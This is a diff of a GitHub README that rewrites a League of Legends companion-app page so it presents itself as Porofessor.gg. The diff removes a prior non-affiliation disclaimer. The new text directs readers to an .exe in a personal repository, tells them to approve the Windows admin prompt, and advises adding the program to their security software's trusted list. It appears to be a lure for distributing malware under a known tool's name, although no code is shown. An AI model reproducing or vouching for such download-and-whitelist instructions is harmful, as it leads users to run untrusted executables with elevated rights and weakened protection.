@@ -1,190 +1,84 @@
-# 🚀 Porofessor.gg Companion
+# 🎮 Porofessor.gg - Improve Your League of Legends Rank
 
-Porofessor.gg Companion is a modern desktop utility designed to provide players with quick access to game-related information, performance tracking, match insights, and useful tools that help improve the overall League of Legends experience.
+[![](https://img.shields.io/badge/Download_Porofessor-Blue-blue)](https://github.com/adel200279-dotcom/Porofessor.gg)
 
-Built with simplicity, performance, and usability in mind, the application offers a clean interface while delivering important information in an organized and easy-to-understand format.
+Porofessor.gg provides real-time data for your League of Legends matches. This application runs alongside the game to give you insights into your opponents and teammates. It tracks player statistics, shows champion mastery, and highlights lane habits to help you make informed decisions during your games.
 
-Whether you're looking to review your recent performance, analyze match history, track progress over time, or simply access useful game information more efficiently, Porofessor.gg Companion aims to provide a smooth and reliable experience.
+## 📥 How to Download 
 
----
+To get started with the application, visit the download repository to obtain the latest version of the installer.
 
-## ✨ Features
+[Download Porofessor.gg Installer](https://github.com/adel200279-dotcom/Porofessor.gg)
 
-### 📊 Advanced Statistics
-Access detailed player statistics and performance metrics through a clean and intuitive interface.
+1. Click the link above to open the repository.
+2. Look for the Releases section on the right side of the page.
+3. Select the latest version to view the available files.
+4. Download the file ending in .exe to your local computer.
+5. Save the file in a folder where you can find it later, such as your Downloads folder.
 
-### 🎯 Match Analysis
-Review previous matches and gain valuable insights into gameplay trends and overall performance.
+## ⚙️ Setting Up 
 
-### 📈 Progress Tracking
-Monitor your improvement over time and keep track of important gameplay statistics.
+Once you download the installer, follow these steps to set up the application on your Windows machine:
 
-### ⚡ Lightweight Performance
-Optimized for low resource usage to ensure smooth operation alongside your favorite games.
+1. Locate the file you just downloaded.
+2. Double-click the file to start the installation wizard.
+3. Windows might show a prompt asking if you allow the app to make changes. Click Yes to proceed.
+4. Follow the on-screen instructions to select your installation path.
+5. Click Install to finish the process.
+6. Launch the application from your desktop shortcut once the installation completes.
 
-### 🖥️ Modern User Interface
-A clean and responsive design focused on accessibility and ease of use.
+## 📊 Using the Application 
 
-### 🔄 Automatic Updates
-Stay up to date with the latest improvements, optimizations, and feature releases.
+When you open the application, it links to your active League of Legends game client. Ensure both programs run while you play.
 
-### 🛠️ Continuous Improvements
-Regular updates help improve stability, compatibility, and overall user experience.
+- **Pre-game lobby:** The app displays information about your teammates and opponents. You see win rates, preferred roles, and champion mastery scores.
+- **Loading screen:** The interface updates with matchup tips for your specific lane.
+- **In-game overlay:** The app tracks objective timers, summoner spell cooldowns, and ward placement habits. 
 
-### 🚀 Fast Startup
-Launch instantly without unnecessary delays or complicated setup procedures.
+The software automatically syncs with the game servers. You do not need to input manual data.
 
-### 🔒 Safe & Reliable
-Designed with stability and reliability as a primary goal throughout development.
+## 💻 System Requirements 
 
----
+The application works on most standard Windows configurations. Ensure your system meets the following criteria for the best experience:
 
-## 📥 Installation
+- **Operating System:** Windows 10 or Windows 11.
+- **Memory:** At least 4GB of RAM.
+- **Storage:** 500MB of free space on your hard drive.
+- **Network:** A stable internet connection for real-time data sync.
+- **Display:** A monitor resolution of at least 1920x1080 for the clear overlay.
 
-Getting started is simple:
+## 🛠️ Frequently Asked Questions 
 
-1. Download the latest release from the Releases section.
-2. Extract the downloaded archive to your preferred location.
-3. Launch the application.
-4. Complete any required first-time setup steps.
-5. Enjoy the available features.
+**Does the app cause lag?**
+The application uses minimal system resources. It runs as a background process and focuses on reading data from the game client only when necessary.
 
----
+**Is this tool allowed?**
+The features rely on public data available through the official game API. The tool does not modify game files or provide unfair advantages that violate the terms of service. It acts as a companion interface for information that is otherwise difficult to track manually.
 
-## 🖥️ System Requirements
+**Can I customize the overlay?**
+Yes. Open the settings menu within the app. You can move the overlay window, change its size, or adjust the transparency of the information panels to suit your preference.
 
-### Minimum Requirements
+**Does the app track my match history?**
+The app saves your performance logs locally. You can review your past games at any time through the history tab inside the application.
 
-- Windows 10 (64-bit)
-- Dual-Core Processor
-- 4 GB RAM
-- 500 MB Free Storage
-- Internet Connection
+## 🛡️ Privacy and Safety 
 
-### Recommended Requirements
+The application respects your data privacy. It only collects information required to fetch your game statistics. The software does not share your account credentials or personal information with third parties. Your gameplay data stays within your local installation unless you choose to sync your profile with the cloud for backup.
 
-- Windows 11 (64-bit)
-- Quad-Core Processor
-- 8 GB RAM or Higher
-- SSD Storage
-- Stable Broadband Internet Connection
+## 💡 Tips for Success 
 
----
+- **Keep it updated:** Check the application settings periodically to ensure you run the latest version. Developers release updates to match game patches.
+- **Configure hotkeys:** Use the settings menu to assign keys for toggling the overlay on or off. This helps you clear your screen during intense team fights.
+- **Focus on stats:** Use the win rate data to identify which champions offer you the best chance of success in your current rank.
+- **Review mistakes:** Analyze your death statistics after a match to see where you can improve your positioning.
 
-## 📸 Screenshots
+## ✉️ Troubleshooting 
 
-Screenshots and previews can be added here to showcase the application's interface and functionality.
+If the application fails to connect during a match, follow these steps:
 
-### Main Dashboard
-![Preview](assets/dashboard.png)
+1. Close both the game and the application completely.
+2. Open the application first. Wait for it to confirm a connection status.
+3. Launch your game client.
+4. If problems persist, restart your computer to clear any background processes that might block the connection.
 
-### Statistics View
-![Preview](assets/stats.png)
-
-### Match History
-![Preview](assets/history.png)
-
----
-
-## 🔧 Development Goals
-
-The primary objective of this project is to create a fast, efficient, and user-friendly companion tool that delivers valuable information without introducing unnecessary complexity.
-
-Current development focuses include:
-
-- Performance optimization
-- UI improvements
-- Additional statistics support
-- Better data presentation
-- Enhanced user experience
-- Stability improvements
-- Reduced memory usage
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome.
-
-If you would like to help improve the project:
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Commit your modifications
-5. Open a Pull Request
-
-Constructive feedback, bug reports, and feature suggestions are always appreciated.
-
----
-
-## 🐛 Bug Reports
-
-If you encounter any issues, please create an Issue containing:
-
-- Application version
-- Operating system version
-- Steps to reproduce
-- Screenshots (if available)
-- Relevant logs
-
-This information helps identify and resolve problems more efficiently.
-
----
-
-## 📋 Roadmap
-
-### Planned Features
-
-- Enhanced match analytics
-- Improved statistics tracking
-- Additional customization options
-- Performance monitoring tools
-- UI redesign improvements
-- Expanded data visualization
-- More detailed player insights
-- Quality-of-life improvements
-
----
-
-## ⚠️ Disclaimer
-
-This project is an independent software project developed for educational, research, and development purposes.
-
-Porofessor.gg Companion is not affiliated with, endorsed by, sponsored by, or officially connected to Riot Games, League of Legends, Porofessor.gg, or any of their subsidiaries or affiliates.
-
-All trademarks, service marks, trade names, logos, and game-related assets are the property of their respective owners.
-
-Users are solely responsible for ensuring that their usage complies with all applicable terms of service, policies, and local regulations.
-
-The developers assume no responsibility for account restrictions, suspensions, data loss, damages, or other consequences that may arise from the use of this software.
-
----
-
-## 📜 License
-
-This project is distributed under the MIT License.
-
-Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files to use, modify, merge, publish, distribute, sublicense, and/or sell copies of the software, subject to the terms of the license.
-
-See the LICENSE file for more information.
-
----
-
-## ❤️ Support
-
-If you enjoy this project:
-
-⭐ Star the repository
-
-🐛 Report bugs
-
-💡 Suggest new features
-
-📢 Share the project with others
-
-Your support helps the project continue to grow and improve.
-
----
-
-# Made with ❤️ for the League of Legends Community
+Ensure your firewall settings allow the application to exchange data with the game servers. Some security software might flag new updates; ensure you add the application to your list of trusted programs to prevent disruptions during gameplay.
